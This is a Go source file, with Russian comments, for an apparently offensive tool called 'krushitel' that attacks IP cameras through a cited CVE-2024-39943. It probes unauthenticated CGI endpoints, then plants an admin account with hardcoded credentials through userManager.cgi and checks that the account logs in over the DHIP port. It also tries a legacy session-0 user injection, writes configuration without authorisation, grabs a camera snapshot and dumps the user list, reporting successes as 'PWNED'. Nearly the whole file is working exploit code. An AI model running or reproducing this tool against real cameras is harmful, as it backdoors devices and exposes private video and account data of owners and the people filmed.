package main

import (
	"context"
	"flag"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"

	"krushitel/core/dhip"
	"krushitel/core/fwd"
)

type dialer = dhip.Dialer

func httpClientOn(dial dialer, timeout time.Duration) *http.Client {
	return &http.Client{
		Timeout: timeout,
		Transport: &http.Transport{
			DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
				return dial()
			},
		},
	}
}

func httpText(client *http.Client, method, urlStr, body string) (int, string, error) {
	var reader io.Reader
	if body != "" {
		reader = strings.NewReader(body)
	}
	req, err := http.NewRequest(method, urlStr, reader)
	if err != nil {
		return 0, "", err
	}
	if body != "" {
		req.Header.Set("Content-Type", "application/json")
	}
	resp, err := client.Do(req)
	if err != nil {
		return 0, "", err
	}
	defer resp.Body.Close()
	data, err := io.ReadAll(io.LimitReader(resp.Body, 512*1024))
	if err != nil {
		return resp.StatusCode, "", err
	}
	return resp.StatusCode, string(data), nil
}

func main() {
	serial := flag.String("serial", "", "серийник: туннель своим стеком fwd")
	host := flag.String("host", "127.0.0.1", "хост без туннеля (форвард/прямой)")
	httpPort := flag.Int("http", 80, "веб-порт камеры")
	dhipPort := flag.Int("dhip", 5000, "DHIP-порт камеры")
	user := flag.String("user", "krushitel", "dummy-логин")
	pass := flag.String("pass", "TancuiPantera1337", "dummy-пароль")
	dhipUser := flag.String("dhip-user", "", "DHIP-path логин (по умолчанию -user)")
	dhipPass := flag.String("dhip-pass", "", "DHIP-path пароль (по умолчанию -pass)")
	flag.Parse()

	if *dhipUser == "" {
		*dhipUser = *user
	}
	if *dhipPass == "" {
		*dhipPass = *pass
	}

	dhip.LogHook = func(format string, args ...any) {
		fmt.Printf("[DHIP] "+format+"\n", args...)
	}

	var httpDial, dhipDial dialer
	if *serial != "" {
		fmt.Printf("== туннель по серийнику %s (порты %d/%d)...\n", *serial, *httpPort, *dhipPort)
		f, err := fwd.Start(*serial, []fwd.PortSpec{
			{Local: 0, Remote: *httpPort},
			{Local: 0, Remote: *dhipPort},
		}, 0, "", "")
		if err != nil {
			fmt.Println("[-] туннель не встал:", err)
			os.Exit(1)
		}
		defer f.Stop()
		hp, dp := *httpPort, *dhipPort
		httpDial = func() (net.Conn, error) { return f.DialCamera(hp) }
		dhipDial = func() (net.Conn, error) { return f.DialCamera(dp) }
		fmt.Println("[+] туннель ок")
	} else {
		hp, dp := *httpPort, *dhipPort
		h := *host
		httpDial = func() (net.Conn, error) { return net.DialTimeout("tcp", fmt.Sprintf("%s:%d", h, hp), 10*time.Second) }
		dhipDial = func() (net.Conn, error) { return net.DialTimeout("tcp", fmt.Sprintf("%s:%d", h, dp), 10*time.Second) }
		fmt.Printf("== цель %s (http %d, dhip %d)\n", h, hp, dp)
	}

	verdict := ""

	fmt.Println("\n== [1/5] unauth probe (CVE-2024-39943, CGI)")
	client := httpClientOn(httpDial, 12*time.Second)
	probeOK := false
	code, text, err := httpText(client, "GET", "http://camera/cgi-bin/configManager.cgi?action=getConfig&name=General", "")
	if err != nil {
		fmt.Println("    cgi getConfig: FAIL", err)
	} else {
		snippet := strings.ReplaceAll(text[:min(len(text), 160)], "\n", " ")
		fmt.Printf("    cgi getConfig: HTTP %d, body: %s\n", code, snippet)
		if code == 200 && (strings.Contains(text, "table.General") || strings.Contains(text, "LocaleName")) {
			probeOK = true
		}
	}

	loginProbe := `{"method":"global.login","params":{"userName":"admin","password":"","clientType":"Web3.0","loginType":"Direct"},"id":1,"session":0}`
	if pcode, ptext, perr := httpText(client, "POST", "http://camera/RPC2_Login", loginProbe); perr == nil {
		psnip := strings.ReplaceAll(ptext[:min(len(ptext), 100)], "\n", " ")
		fmt.Printf("    /RPC2_Login: HTTP %d, body: %s\n", pcode, psnip)
	}

	if probeOK {
		fmt.Println("[+] ПРОБА: unauth-доступ подтверждён")
	} else {
		fmt.Println("[-] ПРОБА: CGI глухой — 39943 HTTP-транспортом не выглядит")
		verdict += "probe: deaf; "
	}

	fmt.Println("\n== [2/5] addUser через userManager.cgi (unauth)")
	q := url.Values{}
	q.Set("action", "addUser")
	q.Set("user.Name", *user)
	q.Set("user.Password", *pass)
	q.Set("user.Group", "admin")
	q.Set("user.Sharable", "true")
	q.Set("user.Reserved", "false")
	q.Set("user.AuthList", "Config|Info|Monitor_01|Playback_01")
	addURL := "http://camera/cgi-bin/userManager.cgi?" + q.Encode()
	code, text, err = httpText(client, "GET", addURL, "")
	cgiOK := false
	if err != nil {
		fmt.Println("    FAIL:", err)
	} else {
		body := strings.TrimSpace(text)
		if len(body) > 200 {
			body = body[:200]
		}
		fmt.Printf("    HTTP %d, ответ: %q\n", code, body)
		if strings.Contains(text, "OK") {
			cgiOK = true
		} else if strings.Contains(strings.ToLower(text), "exist") {
			fmt.Println("[!] юзер уже существует — переходим к верификации")
			cgiOK = true
		}
	}

	fmt.Println("\n== [3/5] верификация логином по DHIP", *dhipPort)
	verified := false
	for attempt := 1; attempt <= 2; attempt++ {
		err := dhip.VerifyLoginDial(dhipDial, *user, *pass, 25*time.Second)
		if err == nil {
			verified = true
			break
		}
		fmt.Printf("    попытка %d: %v\n", attempt, err)
		time.Sleep(2 * time.Second)
	}
	if verified {
		fmt.Printf("[+] ВЕРИФИКАЦИЯ: %s:%s логинится — 39943 HTTP РАБОТАЕТ\n", *user, *pass)
		verdict += "HTTP-путь: PWNED; "
	} else if cgiOK {
		fmt.Println("[!] addUser ответил OK, но логин не прошёл — юзер битый или вектор частичный")
		verdict += "HTTP-путь: add-ok/no-login; "
	} else {
		fmt.Println("[-] HTTP-путь не взял")
		verdict += "HTTP-путь: dead; "
	}

	fmt.Println("\n== [4/5] DHIP session-0 addUser (легаси-вектор, к CGI-пути 39943 не относится)")
	fanLogin, fanPass, ok := dhip.AddUser39943Fanout(dhipDial, *dhipUser, *dhipPass)
	if ok {
		fmt.Printf("[+] session-0 addUser РАБОТАЕТ: посажен %s:%s\n", fanLogin, fanPass)
		verdict += fmt.Sprintf("; DHIP session-0: PWNED (%s)", fanLogin)
	} else {
		fmt.Println("[-] session-0 addUser отвергнут — прошивка патчена; CGI-путь 39943 от этого не зависит")
		verdict += "; DHIP session-0: patched (не влияет)"
	}

	fmt.Println("\n== [5/5] CGI surface: setConfig, snapshot, getUserInfoAll без авторизации")
	if code, text, err := httpText(client, "GET", "http://camera/cgi-bin/configManager.cgi?action=setConfig&General.LockLoginTimes=5", ""); err == nil && code == 200 && strings.Contains(text, "OK") {
		fmt.Println("[+] setConfig: запись конфига без авторизации (OK)")
		verdict += "; CGI setConfig: OK"
	} else if err != nil {
		fmt.Println("[-] setConfig:", err)
	}
	if code, snap, err := httpText(client, "GET", "http://camera/cgi-bin/snapshot.cgi?channel=1", ""); err == nil && code == 200 && strings.HasPrefix(snap, "\xff\xd8") {
		fmt.Printf("[+] snapshot.cgi: %d байт JPEG без авторизации\n", len(snap))
		verdict += fmt.Sprintf("; unauth snapshot: %d B", len(snap))
	} else if err != nil {
		fmt.Println("[-] snapshot:", err)
	}
	if code, users, err := httpText(client, "GET", "http://camera/cgi-bin/userManager.cgi?action=getUserInfoAll", ""); err == nil && code == 200 && strings.Contains(users, "users[") {
		fmt.Printf("[+] getUserInfoAll: %d байт, список юзеров виден без авторизации\n", len(users))
		verdict += "; users: visible"
	} else if err != nil {
		fmt.Println("[-] getUserInfoAll:", err)
	}

	fmt.Println("\n== ВЕРДИКТ ==")
	fmt.Println(verdict)
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
